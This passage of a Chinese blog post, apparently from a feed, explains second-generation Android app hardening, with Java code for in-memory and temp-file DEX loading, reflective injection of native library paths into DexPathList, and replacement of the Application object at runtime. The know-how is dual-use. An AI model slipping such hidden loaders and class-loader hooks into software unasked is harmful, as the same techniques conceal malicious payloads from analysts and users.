<p>当内存加载失败时，回退到临时文件方案（仍比一代安全，因为用后即删）：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 临时文件方案（Android 5.0-7.1回退使用）
 *
 * 流程：
 * 1. 将DEX写入临时文件
 * 2. 使用DexFile.loadDex加载
 * 3. 创建Element对象
 * 4. 运行后安全删除临时文件
 */</span>
<span class="hljs-meta">@SuppressWarnings("deprecation")</span>
<span class="hljs-keyword">private</span> Object <span class="hljs-title function_">createDexElementViaFile</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] dexBytes, <span class="hljs-type">int</span> index)</span> <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-comment">// 1. 创建临时文件</span>
    <span class="hljs-type">File</span> <span class="hljs-variable">tempDir</span> <span class="hljs-operator">=</span> getTempDexDir();
    <span class="hljs-type">String</span> <span class="hljs-variable">tempFileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">"memory_dex_"</span> + System.currentTimeMillis() + <span class="hljs-string">"_"</span> + index + <span class="hljs-string">".dex"</span>;
    <span class="hljs-type">File</span> <span class="hljs-variable">tempFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(tempDir, tempFileName);

    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// 2. 写入DEX数据</span>
        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(tempFile);
        fos.write(dexBytes);
        fos.flush();
        fos.close();

        <span class="hljs-comment">// 记录临时文件，后续清理</span>
        mTempFiles.add(tempFile);

        <span class="hljs-comment">// 3. 使用DexFile.loadDex加载（API 26已废弃，但5.0-7.1有效）</span>
        <span class="hljs-type">File</span> <span class="hljs-variable">optimizedDir</span> <span class="hljs-operator">=</span> getOptimizedDexDir();
        <span class="hljs-type">DexFile</span> <span class="hljs-variable">dexFile</span> <span class="hljs-operator">=</span> DexFile.loadDex(
                tempFile.getAbsolutePath(),
                optimizedDir.getAbsolutePath() + <span class="hljs-string">"/"</span> + tempFileName + <span class="hljs-string">".odex"</span>,
                <span class="hljs-number">0</span>
        );

        <span class="hljs-comment">// 4. 创建Element对象</span>
        <span class="hljs-keyword">return</span> createElementObject(dexFile, tempFile);

    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-comment">// 失败时清理临时文件</span>
        secureDelete(tempFile);
        <span class="hljs-keyword">throw</span> e;
    }
}

<span class="hljs-comment">/**
 * 安全删除文件（先清空内容再删除）
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">secureDelete</span><span class="hljs-params">(File file)</span> {
    <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span> &amp;&amp; file.exists()) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 先清空文件内容</span>
            <span class="hljs-type">RandomAccessFile</span> <span class="hljs-variable">raf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RandomAccessFile</span>(file, <span class="hljs-string">"rws"</span>);
            raf.setLength(<span class="hljs-number">0</span>);
            raf.close();
        } <span class="hljs-keyword">catch</span> (IOException ignored) {}
        file.delete();
    }
}

<span class="hljs-comment">/**
 * 清理所有临时文件（应用退出时调用）
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cleanup</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span> (mTempFiles) {
        <span class="hljs-keyword">for</span> (File file : mTempFiles) {
            secureDelete(file);
        }
        mTempFiles.clear();
    }
}
</code></pre>
<h4 data-id="heading-33">2.5 Native库路径注入（RetroLoadLibrary）</h4>
<blockquote>
<p><strong>与一代的区别</strong>：这是二代加固<strong>新增的组件</strong>。一代使用<code>DexClassLoader</code>原生支持<code>librarySearchPath</code>参数，而二代的<code>InMemoryDexClassLoader</code>在Android 10以下不支持该参数，因此需要手动注入。</p>
</blockquote>
<h5 data-id="heading-34">问题背景</h5>
<p>Android 10以下版本的<code>InMemoryDexClassLoader</code>不支持<code>librarySearchPath</code>参数：</p>

























<table><thead><tr><th>Android版本</th><th>构造函数</th><th>Native库支持</th></tr></thead><tbody><tr><td>Android 10+</td><td><code>InMemoryDexClassLoader(ByteBuffer[], libraryPath, parent)</code></td><td>原生支持</td></tr><tr><td>Android 8.0-9</td><td><code>InMemoryDexClassLoader(ByteBuffer[], parent)</code></td><td>不支持</td></tr><tr><td>Android 5.0-7.1</td><td>无此API</td><td>不支持</td></tr></tbody></table>
<p>这意味着如果源应用包含Native库（JNI），在Android 10以下版本会出现<code>UnsatisfiedLinkError</code>。</p>
<h4 data-id="heading-35">解决方案</h4>
<p>使用从<strong>Tinker热修复框架</strong>移植的<code>RetroLoadLibrary</code>工具类，通过反射将Native库路径注入到<code>DexPathList</code>中：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * RetroLoadLibrary.java - Native库路径注入工具
 *
 * 来源：Tinker热修复框架
 * 功能：将Native库路径注入到ClassLoader中，解决JNI加载问题
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RetroLoadLibrary</span> {

    <span class="hljs-comment">/**
     * 安装Native库路径
     * 根据Android版本选择不同的注入方案
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">installNativeLibraryPath</span><span class="hljs-params">(
            ClassLoader classLoader, File folder)</span> <span class="hljs-keyword">throws</span> Throwable {

        <span class="hljs-keyword">if</span> (folder == <span class="hljs-literal">null</span> || !folder.exists()) {
            Log.i(TAG, <span class="hljs-string">"folder is illegal: "</span> + folder);
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// 根据Android版本选择注入方案</span>
        <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="hljs-number">25</span>) {
            <span class="hljs-comment">// Android 7.1+ (API 25+)</span>
            <span class="hljs-keyword">try</span> {
                V25.install(classLoader, folder);
                <span class="hljs-keyword">return</span>;
            } <span class="hljs-keyword">catch</span> (Throwable e) {
                <span class="hljs-comment">// 回退到V23方案</span>
                V23.install(classLoader, folder);
            }
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="hljs-number">23</span>) {
            <span class="hljs-comment">// Android 6.0-7.0 (API 23-24)</span>
            <span class="hljs-keyword">try</span> {
                V23.install(classLoader, folder);
            } <span class="hljs-keyword">catch</span> (Throwable e) {
                <span class="hljs-comment">// 回退到V14方案</span>
                V14.install(classLoader, folder);
            }
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="hljs-number">14</span>) {
            <span class="hljs-comment">// Android 4.0-5.1 (API 14-22)</span>
            V14.install(classLoader, folder);
        }
    }
}
</code></pre>
<h4 data-id="heading-36">DexPathList结构（Native库相关）</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">DexPathList</span>
│
├── <span class="hljs-attr">dexElements</span>: <span class="hljs-title class_">Element</span>[]                          ← <span class="hljs-variable constant_">DEX</span>加载元素
│
├── <span class="hljs-attr">nativeLibraryDirectories</span>: <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">File</span>&gt;            ← 用户<span class="hljs-title class_">Native</span>库目录
│   └── [<span class="hljs-regexp">/data/</span>app/&lt;package&gt;<span class="hljs-regexp">/lib/</span>arm64, ...]
│
├── <span class="hljs-attr">systemNativeLibraryDirectories</span>: <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">File</span>&gt;      ← 系统<span class="hljs-title class_">Native</span>库目录
│   └── [<span class="hljs-regexp">/system/</span>lib64, <span class="hljs-regexp">/vendor/</span>lib64, ...]
│
└── <span class="hljs-attr">nativeLibraryPathElements</span>: <span class="hljs-title class_">NativeLibraryElement</span>[]  ← 合并后的搜索路径
    └── 用于<span class="hljs-title function_">findLibrary</span>()查找.<span class="hljs-property">so</span>文件
</code></pre>
<h4 data-id="heading-37">Android 4.0-5.1 注入方案（V14）</h4>
<p>最简单的版本，直接扩展<code>nativeLibraryDirectories</code>数组：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * V14方案（Android 4.0-5.1）
 *
 * DexPathList内部结构：
 * - nativeLibraryDirectories: File[]  ← 直接是数组
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">V14</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">install</span><span class="hljs-params">(ClassLoader classLoader, File folder)</span> <span class="hljs-keyword">throws</span> Throwable {
        <span class="hljs-comment">// 1. 获取pathList</span>
        <span class="hljs-type">Field</span> <span class="hljs-variable">pathListField</span> <span class="hljs-operator">=</span> ReflectUtil.findField(classLoader, <span class="hljs-string">"pathList"</span>);
        <span class="hljs-type">Object</span> <span class="hljs-variable">dexPathList</span> <span class="hljs-operator">=</span> pathListField.get(classLoader);

        <span class="hljs-comment">// 2. 扩展nativeLibraryDirectories数组</span>
        <span class="hljs-comment">// 原始数组：[/system/lib]</span>
        <span class="hljs-comment">// 扩展后：  [/data/.../lib, /system/lib]</span>
        ReflectUtil.expandFieldArray(
                dexPathList,
                <span class="hljs-string">"nativeLibraryDirectories"</span>,
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>[]{folder}
        );
    }
}
</code></pre>
<h4 data-id="heading-38">Android 6.0-7.0 注入方案（V23）</h4>
<p>从Android 6.0开始，<code>nativeLibraryDirectories</code>变成<code>List&lt;File&gt;</code>，且需要重建<code>nativeLibraryPathElements</code>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * V23方案（Android 6.0-7.0）
 *
 * DexPathList内部结构：
 * - nativeLibraryDirectories: List&lt;File&gt;       ← 变成List
 * - systemNativeLibraryDirectories: List&lt;File&gt; ← 新增系统目录
 * - nativeLibraryPathElements: Element[]       ← 需要重建
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">V23</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">install</span><span class="hljs-params">(ClassLoader classLoader, File folder)</span> <span class="hljs-keyword">throws</span> Throwable {
        <span class="hljs-comment">// 1. 获取pathList</span>
        <span class="hljs-type">Field</span> <span class="hljs-variable">pathListField</span> <span class="hljs-operator">=</span> ReflectUtil.findField(classLoader, <span class="hljs-string">"pathList"</span>);
        <span class="hljs-type">Object</span> <span class="hljs-variable">dexPathList</span> <span class="hljs-operator">=</span> pathListField.get(classLoader);

        <span class="hljs-comment">// 2. 获取并修改nativeLibraryDirectories</span>
        <span class="hljs-type">Field</span> <span class="hljs-variable">nativeLibDirsField</span> <span class="hljs-operator">=</span> ReflectUtil.findField(
                dexPathList, <span class="hljs-string">"nativeLibraryDirectories"</span>);
        List&lt;File&gt; origLibDirs = (List&lt;File&gt;) nativeLibDirsField.get(dexPathList);

        <span class="hljs-comment">// 创建新列表（原列表可能是不可修改的）</span>
        ArrayList&lt;File&gt; libDirs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(origLibDirs);
        libDirs.add(<span class="hljs-number">0</span>, folder);  <span class="hljs-comment">// 新路径放在最前面，优先搜索</span>
        nativeLibDirsField.set(dexPathList, libDirs);

        <span class="hljs-comment">// 3. 获取systemNativeLibraryDirectories</span>
        <span class="hljs-type">Field</span> <span class="hljs-variable">sysLibDirsField</span> <span class="hljs-operator">=</span> ReflectUtil.findField(
                dexPathList, <span class="hljs-string">"systemNativeLibraryDirectories"</span>);
        List&lt;File&gt; systemLibDirs = (List&lt;File&gt;) sysLibDirsField.get(dexPathList);

        <span class="hljs-comment">// 4. 合并所有目录</span>
        ArrayList&lt;File&gt; allLibDirs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(libDirs);
        allLibDirs.addAll(systemLibDirs);

        <span class="hljs-comment">// 5. 调用makePathElements重建nativeLibraryPathElements</span>
        <span class="hljs-comment">// 签名：static Element[] makePathElements(List&lt;File&gt;, File, List&lt;IOException&gt;)</span>
        <span class="hljs-type">Method</span> <span class="hljs-variable">makePathElements</span> <span class="hljs-operator">=</span> ReflectUtil.findMethod(
                dexPathList, <span class="hljs-string">"makePathElements"</span>,
                List.class, File.class, List.class);

        ArrayList&lt;IOException&gt; suppressedExceptions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        Object[] elements = (Object[]) makePathElements.invoke(
                dexPathList, allLibDirs, <span class="hljs-literal">null</span>, suppressedExceptions);

        <span class="hljs-comment">// 6. 设置新的nativeLibraryPathElements</span>
        <span class="hljs-type">Field</span> <span class="hljs-variable">elementsField</span> <span class="hljs-operator">=</span> ReflectUtil.findField(
                dexPathList, <span class="hljs-string">"nativeLibraryPathElements"</span>);
        elementsField.set(dexPathList, elements);
    }
}
</code></pre>
<h4 data-id="heading-39">Android 7.1+ 注入方案（V25）</h4>
<p>与V23类似，但<code>makePathElements</code>方法签名不同：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * V25方案（Android 7.1+）
 *
 * 与V23的区别：
 * makePathElements方法签名变化：
 * - V23: makePathElements(List&lt;File&gt;, File, List&lt;IOException&gt;)
 * - V25: makePathElements(List&lt;File&gt;)  ← 参数简化
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">V25</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">install</span><span class="hljs-params">(ClassLoader classLoader, File folder)</span> <span class="hljs-keyword">throws</span> Throwable {
        <span class="hljs-comment">// 步骤1-4与V23相同...</span>

        <span class="hljs-comment">// 5. 调用makePathElements（参数更简单）</span>
        <span class="hljs-comment">// 签名：static NativeLibraryElement[] makePathElements(List&lt;File&gt;)</span>
        <span class="hljs-type">Method</span> <span class="hljs-variable">makePathElements</span> <span class="hljs-operator">=</span> ReflectUtil.findMethod(
                dexPathList, <span class="hljs-string">"makePathElements"</span>, List.class);

        Object[] elements = (Object[]) makePathElements.invoke(
                dexPathList, allLibDirs);

        <span class="hljs-comment">// 6. 设置新的nativeLibraryPathElements</span>
        <span class="hljs-type">Field</span> <span class="hljs-variable">elementsField</span> <span class="hljs-operator">=</span> ReflectUtil.findField(
                dexPathList, <span class="hljs-string">"nativeLibraryPathElements"</span>);
        elementsField.set(dexPathList, elements);
    }
}
</code></pre>
<h4 data-id="heading-40">Native库注入流程图</h4>
<pre><code class="hljs language-javascript" lang="javascript">调用 <span class="hljs-title class_">System</span>.<span class="hljs-title function_">loadLibrary</span>(<span class="hljs-string">"native-lib"</span>)
                    │
                    ↓
<span class="hljs-title class_">ClassLoader</span>.<span class="hljs-title function_">findLibrary</span>(<span class="hljs-string">"native-lib"</span>)
                    │
                    ↓
<span class="hljs-title class_">DexPathList</span>.<span class="hljs-title function_">findLibrary</span>(<span class="hljs-string">"native-lib"</span>)
                    │
                    ↓
遍历 nativeLibraryPathElements
                    │
    ┌───────────────┼───────────────┐
    ↓               ↓               ↓
<span class="hljs-title class_">Element</span>[<span class="hljs-number">0</span>]      <span class="hljs-title class_">Element</span>[<span class="hljs-number">1</span>]      <span class="hljs-title class_">Element</span>[<span class="hljs-number">2</span>]
/data/.../lib   /system/lib64   /vendor/lib64
    │
    ↓
检查 /data/.../lib/libnative-lib.<span class="hljs-property">so</span> 是否存在
    │
    ├── 存在 → 返回完整路径
    └── 不存在 → 继续下一个<span class="hljs-title class_">Element</span>

注入前：[<span class="hljs-regexp">/system/</span>lib64, <span class="hljs-regexp">/vendor/</span>lib64]
注入后：[<span class="hljs-regexp">/data/</span>.../lib, <span class="hljs-regexp">/system/</span>lib64, <span class="hljs-regexp">/vendor/</span>lib64]
        ↑
        新增的路径，优先搜索
</code></pre>
<h4 data-id="heading-41">2.6 Application替换</h4>
<blockquote>
<p><strong>与一代的区别</strong>：此部分逻辑与一代加固<strong>完全相同</strong>，无需修改。Application替换是Android系统级别的操作，与DEX加载方式无关。</p>
</blockquote>
<h5 data-id="heading-42">与一代加固的对比</h5>
<p>Application替换逻辑与一代加固<strong>完全相同</strong>，因为这是Android系统级别的操作，与DEX加载方式无关：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 替换系统中的Application引用
 *
 * 需要替换的位置：
 * 1. LoadedApk.mApplication
 * 2. ActivityThread.mInitialApplication
 * 3. ActivityThread.mAllApplications列表
 * 4. ActivityThread.mBoundApplication.appInfo.className
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">replaceApplicationInSystem</span><span class="hljs-params">(Application shellApp,
                                        Application sourceApp)</span> <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-comment">// ==================== 替换1: LoadedApk.mApplication ====================</span>
    <span class="hljs-type">Context</span> <span class="hljs-variable">contextImpl</span> <span class="hljs-operator">=</span> getApplicationContext();
    Class&lt;?&gt; contextImplClass = Class.forName(<span class="hljs-string">"android.app.ContextImpl"</span>);

    <span class="hljs-comment">// 获取ContextImpl.mPackageInfo (即LoadedApk)</span>
    <span class="hljs-type">Field</span> <span class="hljs-variable">mPackageInfoField</span> <span class="hljs-operator">=</span> findField(contextImplClass, <span class="hljs-string">"mPackageInfo"</span>);
    <span class="hljs-type">Object</span> <span class="hljs-variable">loadedApk</span> <span class="hljs-operator">=</span> mPackageInfoField.get(contextImpl);

    <span class="hljs-comment">// 替换LoadedApk.mApplication</span>
    <span class="hljs-type">Field</span> <span class="hljs-variable">mApplicationField</span> <span class="hljs-operator">=</span> findField(loadedApk.getClass(), <span class="hljs-string">"mApplication"</span>);
    mApplicationField.set(loadedApk, sourceApp);
    log(<span class="hljs-string">"Replaced LoadedApk.mApplication"</span>);

    <span class="hljs-comment">// ==================== 替换2&amp;3: ActivityThread ====================</span>
    <span class="hljs-type">Object</span> <span class="hljs-variable">activityThread</span> <span class="hljs-operator">=</span> getActivityThread();

    <span class="hljs-comment">// 替换mInitialApplication</span>
    <span class="hljs-type">Field</span> <span class="hljs-variable">mInitialAppField</span> <span class="hljs-operator">=</span> findField(activityThread.getClass(), <span class="hljs-string">"mInitialApplication"</span>);
    mInitialAppField.set(activityThread, sourceApp);
    log(<span class="hljs-string">"Replaced ActivityThread.mInitialApplication"</span>);

    <span class="hljs-comment">// 更新mAllApplications列表</span>
    <span class="hljs-type">Field</span> <span class="hljs-variable">mAllAppsField</span> <span class="hljs-operator">=</span> findField(activityThread.getClass(), <span class="hljs-string">"mAllApplications"</span>);
    ArrayList&lt;Application&gt; mAllApplications =
            (ArrayList&lt;Application&gt;) mAllAppsField.get(activityThread);
    mAllApplications.remove(shellApp);   <span class="hljs-comment">// 移除壳Application</span>
    mAllApplications.add(sourceApp);     <span class="hljs-comment">// 添加源Application</span>
    log(<span class="hljs-string">"Updated ActivityThread.mAllApplications"</span>);

    <span class="hljs-comment">// ==================== 替换4: BoundApplication.appInfo ====================</span>
    updateBoundApplicationInfo(activityThread, mApplicationName);
}
</code></pre>
<h4 data-id="heading-43">Application替换后的系统状态</h4>
<pre><code class="hljs language-ini" lang="ini">替换前：
┌──────────────────────────────────────────────────────────────┐
│ ActivityThread                                               │
│   ├── mInitialApplication ──→ ShellProxyApplicationV2       │
│   ├── mAllApplications: <span class="hljs-section">[ShellProxyApplicationV2]</span>           │
│   └── mBoundApplication                                      │
│         └── <span class="hljs-attr">appInfo.className</span> = <span class="hljs-string">"...ShellProxyApplicationV2"</span>│
├──────────────────────────────────────────────────────────────┤
│ LoadedApk                                                    │
│   └── mApplication ──→ ShellProxyApplicationV2              │
└──────────────────────────────────────────────────────────────┘

替换后：
┌──────────────────────────────────────────────────────────────┐
│ ActivityThread                                               │
│   ├── mInitialApplication ──→ SourceApplication <span class="hljs-section">[OK]</span>        │
│   ├── mAllApplications: <span class="hljs-section">[SourceApplication]</span> <span class="hljs-section">[OK]</span>            │
│   └── mBoundApplication                                      │
│         └── <span class="hljs-attr">appInfo.className</span> = <span class="hljs-string">"...SourceApplication"</span> [OK] │
├──────────────────────────────────────────────────────────────┤
│ LoadedApk                                                    │
│   └── mApplication ──→ SourceApplication <span class="hljs-section">[OK]</span>               │
└──────────────────────────────────────────────────────────────┘
</code></pre>
<h4 data-id="heading-44">调用源Application的生命周期</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 调用源Application的attachBaseContext
 *
 * 关键：必须正确初始化Context，否则会导致NPE
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeSourceApplicationAttach</span><span class="hljs-params">(Application application,
                                           Context baseContext)</span> <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-comment">// 方法1：调用attach方法（首选）</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">Method</span> <span class="hljs-variable">attachMethod</span> <span class="hljs-operator">=</span> findMethod(Application.class, <span class="hljs-string">"attach"</span>);
        <span class="hljs-keyword">if</span> (attachMethod != <span class="hljs-literal">null</span>) {
            attachMethod.setAccessible(<span class="hljs-literal">true</span>);
            attachMethod.invoke(application, baseContext);
            log(<span class="hljs-string">"Called attach method"</span>);
            <span class="hljs-keyword">return</span>;
        }
    } <span class="hljs-keyword">catch</span> (Exception e) {
        log(<span class="hljs-string">"attach method failed: "</span> + e.getMessage());
    }

    <span class="hljs-comment">// 方法2：调用attachBaseContext方法</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">Method</span> <span class="hljs-variable">attachBaseContextMethod</span> <span class="hljs-operator">=</span> findMethod(Application.class, <span class="hljs-string">"attachBaseContext"</span>);
        <span class="hljs-keyword">if</span> (attachBaseContextMethod != <span class="hljs-literal">null</span>) {
            attachBaseContextMethod.setAccessible(<span class="hljs-literal">true</span>);
            attachBaseContextMethod.invoke(application, baseContext);
            log(<span class="hljs-string">"Called attachBaseContext method"</span>);
            <span class="hljs-keyword">return</span>;
        }
    } <span class="hljs-keyword">catch</span> (Exception e) {
        log(<span class="hljs-string">"attachBaseContext failed: "</span> + e.getMessage());
    }

    <span class="hljs-comment">// 方法3：手动设置Context字段</span>
    manuallyAttachContext(application, baseContext);
}

<span class="hljs-comment">/**
 * 手动设置Application的Context字段
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">manuallyAttachContext</span><span class="hljs-params">(Application application,
                                   Context baseContext)</span> <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-comment">// ContextWrapper.mBase字段存储实际的Context实现</span>
    <span class="hljs-type">Field</span> <span class="hljs-variable">mBaseField</span> <span class="hljs-operator">=</span> findField(ContextWrapper.class, <span class="hljs-string">"mBase"</span>);
    mBaseField.set(application, baseContext);
    log(<span class="hljs-string">"Set ContextWrapper.mBase field"</span>);
}
</code></pre>
<h4 data-id="heading-45">onCreate调用</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onCreate();
    log(<span class="hljs-string">"ShellProxyApplicationV2.onCreate() running!"</span>);

    <span class="hljs-keyword">if</span> (mSourceApplication != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 验证Context状态</span>
            <span class="hljs-type">Context</span> <span class="hljs-variable">sourceContext</span> <span class="hljs-operator">=</span> mSourceApplication.getApplicationContext();
            <span class="hljs-keyword">if</span> (sourceContext == <span class="hljs-literal">null</span>) {
                log(<span class="hljs-string">"Source application context is null, trying to fix..."</span>);
                manuallyAttachContext(mSourceApplication, getApplicationContext());
            }

            <span class="hljs-comment">// 调用源程序的onCreate</span>
            mSourceApplication.onCreate();
            log(<span class="hljs-string">"Successfully called onCreate on source application"</span>);

        } <span class="hljs-keyword">catch</span> (Exception e) {
            log(<span class="hljs-string">"Error calling onCreate: "</span> + Log.getStackTraceString(e));
        }
    }
}
</code></pre>
<h3 data-id="heading-46">模块三：Source-App 源程序模块</h3>
<blockquote>
<p><strong>相对一代的改动</strong>：此模块与一代加固<strong>基本相同</strong>，无需特殊改动。源应用的代码结构、AndroidManifest配置等保持一致，仅需修改配置文件使得源程序能生成多个dex文件。</p>
</blockquote>
<h4 data-id="heading-47">3.1 与一代的对比</h4>



































<table><thead><tr><th>对比项</th><th>一代加固 Source-App</th><th>二代加固 Source-App</th></tr></thead><tbody><tr><td><strong>代码改动</strong></td><td>无需修改</td><td>无需修改</td></tr><tr><td><strong>Manifest配置</strong></td><td>无需修改</td><td>无需修改</td></tr><tr><td><strong>Multidex兼容</strong></td><td>限制只能生成1个dex</td><td><code>gradle配置支持多dex</code></td></tr><tr><td><strong>Native库</strong></td><td>原生支持</td><td>原生支持</td></tr><tr><td><strong>最低SDK</strong></td><td>API 14+</td><td>API 21+</td></tr></tbody></table>
<h4 data-id="heading-48">3.2 源程序要求</h4>
<h5 data-id="heading-49">对源程序的要求</h5>
<p>二代加固对源程序的要求与一代完全一致，仅有一点改动：</p>
<ol>
<li><strong>Multidex支持</strong>
<ul>
<li>二代加固支持Multidex生成多dex，源程序无需做任何改动</li>
<li>build.gradle.kts配置文件删除混淆使得方法数增加，开启支持MultiDex以支持生成多个dex</li>
</ul>
</li>
</ol>
<h4 data-id="heading-50">3.3 加固后的APK结构</h4>
<pre><code class="hljs language-css" lang="css">加固后的APK结构：
├── AndroidManifest<span class="hljs-selector-class">.xml</span>    ← 修改：application指向壳Application
├── classes<span class="hljs-selector-class">.dex</span>            ← 核心：<span class="hljs-selector-attr">[壳DEX]</span><span class="hljs-selector-attr">[加密DEX集合]</span><span class="hljs-selector-attr">[大小]</span>
├── lib/                   ← 保持：原Native库
│   ├── armeabi-v7a/
│   ├── arm64-v8a/
│   └── ...
├── res/                   ← 保持：原资源文件
├── assets/                ← 保持：原资产文件
└── META-INF/              ← 重新签名
</code></pre>
<hr/>
<h3 data-id="heading-51">总结：一代与二代加固对比</h3>













































<table><thead><tr><th>特性</th><th>一代加固 (V1)</th><th>二代加固 (V2)</th></tr></thead><tbody><tr><td><strong>DEX存储位置</strong></td><td>写入文件系统</td><td>仅在内存中</td></tr><tr><td><strong>核心ClassLoader</strong></td><td><code>DexClassLoader</code></td><td><code>InMemoryDexClassLoader</code></td></tr><tr><td><strong>安全性</strong></td><td>中等（可被文件监控）</td><td>较高（需内存dump）</td></tr><tr><td><strong>最低版本</strong></td><td>Android 4.0+</td><td>Android 5.0+</td></tr><tr><td><strong>兼容性复杂度</strong></td><td>低</td><td>高（需处理多版本差异）</td></tr><tr><td><strong>Native库支持</strong></td><td>原生支持</td><td>需手动注入（Android 10以下）</td></tr><tr><td><strong>Multidex支持</strong></td><td>需控制单个dex生成</td><td>可支持多dex</td></tr></tbody></table>
<h4 data-id="heading-52">二代加固的优势</h4>
<ol>
<li><strong>更高安全性</strong>：DEX不落地，攻击者无法通过文件监控获取</li>
<li><strong>原生Multidex支持</strong>：<code>ByteBuffer[]</code>天然支持多DEX</li>
<li><strong>更快的加载速度</strong>：无需写入磁盘的I/O开销</li>
</ol>
<h4 data-id="heading-53">二代加固的挑战</h4>
<ol>
<li><strong>版本兼容性</strong>：需要处理Android 5.0-9的各种API差异</li>
<li><strong>Native库注入</strong>：Android 10以下需要手动处理</li>
</ol>
<h4 data-id="heading-54">进一步安全增强</h4>
<p>二代加固虽然比一代安全，但仍然可以通过<strong>内存dump</strong>技术获取DEX。为进一步增强安全性，后续的技术路线将沿下面方向发展：</p>
<ol>
<li><strong>指令抽离</strong>：发布时清除DEX函数体（CodeItem）并单独加密存储；运行时按需恢复至内存</li>
<li><strong>Native化</strong>：将Java代码转换为Native代码</li>
<li><strong>VMP（虚拟机保护）</strong>：将关键代码转换为自定义字节码</li>
</ol>
<p>这将是本系列后续文章的演进思路。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js 编程实战：模板引擎与静态资源]]></title>    <link>https://juejin.cn/post/7589916567875551274</link>    <guid>https://juejin.cn/post/7589916567875551274</guid>    <pubDate>2026-01-01T05:48:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589916567875551274" data-draft-id="7589903499599249462" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js 编程实战：模板引擎与静态资源"/> <meta itemprop="keywords" content="后端,Node.js,前端"/> <meta itemprop="datePublished" content="2026-01-01T05:48:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" 